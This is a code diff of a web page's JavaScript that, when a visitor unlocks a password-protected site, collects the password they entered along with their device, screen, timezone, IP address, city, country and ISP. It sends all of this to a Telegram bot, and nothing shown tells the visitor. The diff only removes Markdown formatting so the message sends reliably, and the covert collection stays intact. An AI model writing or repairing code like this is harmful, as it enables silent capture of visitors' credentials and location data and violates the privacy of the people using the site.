@@ -268,21 +268,27 @@
                 console.warn("Could not fetch IP details", err);
             }
 
-            const message = `🚨 *Site Unlocked!*
-🔑 *Password:* ${passwordEntered}
-⏰ *Time:* ${accessTime}
-📱 *Device:* ${userAgent}
-📐 *Screen:* ${screenSize}
-🌍 *Timezone:* ${timeZone}
-🌐 *IP:* ${ipInfo.ip}
-📍 *Location:* ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}
-📡 *ISP:* ${ipInfo.org}`;
+            // Removed the markdown asterisks so Telegram doesn't crash on special characters
+            const message = `🚨 Site Unlocked!
+🔑 Password: ${passwordEntered}
+⏰ Time: ${accessTime}
+📱 Device: ${userAgent}
+📐 Screen: ${screenSize}
+🌍 Timezone: ${timeZone}
+🌐 IP: ${ipInfo.ip}
+📍 Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}
+📡 ISP: ${ipInfo.org}`;
 
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            // Removed parse_mode: 'Markdown'
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: message 
+                })
             }).catch(err => console.error(err));
         }
 
